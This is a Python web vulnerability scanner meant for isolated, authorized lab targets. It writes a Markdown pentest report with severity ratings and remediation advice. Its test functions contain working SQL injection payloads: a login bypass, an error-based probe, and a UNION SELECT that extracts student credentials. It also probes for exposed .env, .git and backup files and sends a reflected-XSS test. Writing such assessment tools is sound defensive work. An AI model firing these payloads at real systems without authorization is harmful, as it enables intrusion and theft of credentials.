"""
Automated web security assessment — for ISOLATED, AUTHORIZED targets only.

Point this at a copy of the system you control (the honeypot, or a staging
mirror built from the real source code in an isolated VM). It runs a battery of
checks, scores findings, and writes a Markdown pentest report you can hand in.

  python -m scanner.assess --target http://127.0.0.1:8080

DO NOT run this against a live production system. The whole project design routes
testing to an isolated copy on purpose: same code, same vulnerabilities, zero
risk to real users or real data.
"""

import argparse
import datetime
import http.cookiejar
import os
import urllib.parse
import urllib.request

# ---- HTTP helper -------------------------------------------------------------

class Client:
    def __init__(self, base: str):
        self.base = base.rstrip("/")
        self.cj = http.cookiejar.CookieJar()
        # NoRedirect so we can detect 302s (auth bypass) ourselves.
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cj), _NoRedirect()
        )

    def get(self, path, headers=None):
        return self._do("GET", path, None, headers)

    def post(self, path, data: dict, headers=None):
        body = urllib.parse.urlencode(data).encode()
        return self._do("POST", path, body, headers)

    def _do(self, method, path, body, headers):
        url = path if path.startswith("http") else self.base + path
        req = urllib.request.Request(url, data=body, method=method)
        req.add_header("User-Agent", "uni-assess/1.0 (authorized-lab-scan)")
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        try:
            resp = self.opener.open(req, timeout=10)
            return resp.getcode(), dict(resp.headers), resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
        except Exception as e:
            return 0, {}, f"__error__:{e}"


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


# ---- Findings ----------------------------------------------------------------

FINDINGS: list[dict] = []

def add(title, severity, endpoint, evidence, remediation):
    FINDINGS.append({
        "title": title, "severity": severity, "endpoint": endpoint,
        "evidence": evidence[:600], "remediation": remediation,
    })
    sev = severity.upper()
    print(f"  [{sev:^8}] {title}  ->  {endpoint}")


# ---- Test modules ------------------------------------------------------------

def test_sqli_auth_bypass(c: Client):
    payloads = ["admin' OR '1'='1", "' OR 1=1-- -", "admin'--"]
    for p in payloads:
        code, hdr, _ = c.post("/login", {"username": p, "password": "x"})
        loc = hdr.get("Location", "")
        if code in (301, 302) and "portal" in loc.lower():
            add("SQL Injection — authentication bypass on /login", "critical", "/login",
                f"Payload username={p!r} redirected to {loc} (logged in without valid creds).",
                "Use parameterized queries / prepared statements. Never build SQL by string "
                "concatenation of user input. Add a generic auth failure message.")
            return
    print("  [   ok   ] /login not bypassable with tested payloads")


def test_sqli_error_based(c: Client):
    # Need a session first.
    c.post("/login", {"username": "admin' OR '1'='1", "password": "x"})
    code, _, body = c.get("/grades?student_id=" + urllib.parse.quote("1'"))
    b = body.lower()
    db_err = any(s in b for s in ("database error", "syntax error", "unrecognized token",
                                  "sqlite", "خطأ في قاعدة البيانات"))
    if db_err:
        add("SQL Injection — error-based on /grades (student_id)", "high", "/grades?student_id=",
            "Single quote in student_id produced a database error reflected to the client.",
            "Parameterize the query. Disable verbose DB errors in responses; log them server-side.")
    else:
        print("  [   ok   ] /grades did not leak a DB error")


def test_sqli_union(c: Client):
    c.post("/login", {"username": "admin' OR '1'='1", "password": "x"})
    payload = "1' UNION SELECT username,password,major FROM students-- -"
    code, _, body = c.get("/grades?student_id=" + urllib.parse.quote(payload))
    if "demo" in body.lower() or "p@ssw0rd" in body.lower():
        add("SQL Injection — UNION-based data extraction on /grades", "critical", "/grades?student_id=",
            "UNION SELECT against the students table returned credential-like rows in the response.",
            "Parameterize queries; apply least-privilege DB accounts; do not expose other tables.")
    else:
        print("  [   ok   ] /grades UNION payload returned nothing obvious")


def test_sensitive_files(c: Client):
    for path, label in [("/.env", "Environment file"),
                        ("/.git/config", "Git config"),
                        ("/backup.sql", "Database backup"),
                        ("/backup.zip", "Backup archive")]:
        code, _, body = c.get(path)
        if code == 200 and not body.startswith("__error__") and "not found" not in body.lower():
            add(f"Sensitive file exposed — {label} ({path})", "high", path,
                f"HTTP 200 with content: {body[:120]!r}",
                "Block dotfiles and backups at the web-server level; never deploy secrets to webroot.")


def test_security_headers(c: Client):
    code, hdr, _ = c.get("/login")
    lower = {k.lower(): v for k, v in hdr.items()}
    wanted = {
        "content-security-policy": "Add a CSP to mitigate XSS.",
        "x-frame-options": "Add X-Frame-Options/CSP frame-ancestors to prevent clickjacking.",
        "x-content-type-options": "Add 'X-Content-Type-Options: nosniff'.",
        "strict-transport-security": "Add HSTS (when served over HTTPS).",
    }
    missing = [h for h in wanted if h not in lower]
    if missing:
        add("Missing security headers", "low", "/login",
            "Absent: " + ", ".join(missing),
            " ".join(wanted[h] for h in missing))


def test_version_disclosure(c: Client):
    code, hdr, _ = c.get("/login")
    server = hdr.get("Server", "")
    powered = hdr.get("X-Powered-By", "")
    if server or powered:
        add("Software version disclosure", "low", "/ (response headers)",
            f"Server: {server!r}  X-Powered-By: {powered!r}",
            "Suppress version banners (ServerTokens Prod, expose_php=Off) to slow targeted attacks.")


def test_xss_reflection(c: Client):
    marker = "<script>xss7331</script>"
    code, _, body = c.get("/search?q=" + urllib.parse.quote(marker))
    if marker in body:
        add("Reflected Cross-Site Scripting (XSS)", "high", "/search?q=",
            "Injected <script> marker was reflected unencoded in the response.",
            "Context-aware output encoding; add a Content-Security-Policy.")
    else:
        print("  [   ok   ] /search did not reflect the XSS marker")


MODULES = [
    test_sqli_auth_bypass, test_sqli_error_based, test_sqli_union,
    test_sensitive_files, test_security_headers, test_version_disclosure,
    test_xss_reflection,
]


# ---- Report ------------------------------------------------------------------

_SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

def write_report(target: str) -> str:
    FINDINGS.sort(key=lambda f: _SEV_ORDER.get(f["severity"], 9))
    ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    out_dir = os.path.join(os.path.dirname(__file__), "..", "reports")
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, f"assessment-{ts}.md")

    counts: dict[str, int] = {}
    for f in FINDINGS:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1

    lines = [
        f"# Web Security Assessment Report",
        f"",
        f"- **Target (isolated copy):** {target}",
        f"- **Date:** {datetime.datetime.now().isoformat(timespec='seconds')}",
        f"- **Scope:** authorized, isolated environment only",
        f"",
        f"## Summary",
        f"",
        f"| Severity | Count |",
        f"|----------|-------|",
    ]
    for sev in ("critical", "high", "medium", "low", "info"):
        if counts.get(sev):
            lines.append(f"| {sev.title()} | {counts[sev]} |")
    lines += ["", f"**Total findings: {len(FINDINGS)}**", "", "## Findings", ""]

    for i, f in enumerate(FINDINGS, 1):
        lines += [
            f"### {i}. {f['title']}",
            f"",
            f"- **Severity:** {f['severity'].title()}",
            f"- **Endpoint:** `{f['endpoint']}`",
            f"- **Evidence:** {f['evidence']}",
            f"- **Remediation:** {f['remediation']}",
            f"",
        ]
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines))
    return path


def main():
    ap = argparse.ArgumentParser(description="Authorized web security assessment (isolated targets only)")
    ap.add_argument("--target", default=os.environ.get("ASSESS_TARGET", "http://127.0.0.1:8080"))
    args = ap.parse_args()

    print(f"\n[*] Assessing (isolated copy): {args.target}\n")
    c = Client(args.target)
    code, _, _ = c.get("/login")
    if code == 0:
        print("[!] Target unreachable. Is the isolated copy running?")
        return
    for mod in MODULES:
        mod(c)
    path = write_report(args.target)
    print(f"\n[+] {len(FINDINGS)} findings. Report written to: {path}\n")


if __name__ == "__main__":
    main()
